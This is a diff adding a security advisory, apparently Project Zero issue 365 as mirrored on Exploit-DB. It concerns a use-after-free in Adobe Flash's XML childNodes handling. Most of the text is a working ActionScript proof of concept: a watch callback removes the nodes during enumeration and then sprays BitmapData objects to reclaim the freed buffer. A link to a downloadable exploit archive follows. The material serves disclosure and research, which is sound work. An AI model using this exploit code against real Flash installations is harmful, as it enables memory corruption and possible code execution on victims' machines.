@@ -1,0 +1,58 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=365&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+If a watch is set on the childNodes object of an XML object, and then the XML object is manipulated in a way that causes its child nodes to be enumerated, the watch will trigger. If the function in the watch deletes all the child nodes, the buffer containing the nodes will be deleted, even though the original function will still access it when it unwinds. This can lead to a childnodes array in ActionScript containing pointers that can be specified by an attacker. A minimal POC is as follows:
+
+var doc:XML = new XML(); 
+var rootNode:XMLNode = doc.createElement("rootNode");  
+var oldest:XMLNode = doc.createElement("oldest"); 
+var middle:XMLNode = doc.createElement("middle"); 
+var youngest:XMLNode = doc.createElement("youngest"); 
+var youngest1:XMLNode = doc.createElement("youngest1"); 
+var youngest2:XMLNode = doc.createElement("youngest2"); 
+var youngest3:XMLNode = doc.createElement("youngest3"); 
+ 
+// add the rootNode as the root of the XML document tree 
+doc.appendChild(rootNode); 
+ 
+// add each of the child nodes as children of rootNode 
+rootNode.appendChild(oldest); 
+rootNode.appendChild(middle); 
+rootNode.appendChild(youngest1);
+rootNode.appendChild(youngest2);
+rootNode.appendChild(youngest3);
+ 
+// create an array and use rootNode to populate it 
+var firstArray:Array = rootNode.childNodes; 
+trace (firstArray.length);
+
+firstArray[0] = "test";
+firstArray.watch("length", f);
+rootNode.appendChild(youngest);
+
+function f(a, b){
+	
+	trace("in f " + a + " " + b + " " + c);
+	if(b == 1){
+	firstArray.unwatch("length");
+	middle.removeNode();
+	oldest.removeNode();
+	youngest1.removeNode();
+	youngest2.removeNode();
+	youngest3.removeNode();
+	youngest.removeNode();
+	}
+	
+	
+	for(var i = 0; i < 100; i++){
+		var b = new flash.display.BitmapData(100, 1000, true, 1000);
+		var c = "aaaaaaaaaaaaa";
+	}
+	
+		trace("end length " + rootNode.childNodes.length);	
+	}
+
+A sample fla and swf are also attached.	
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37859.zip
+
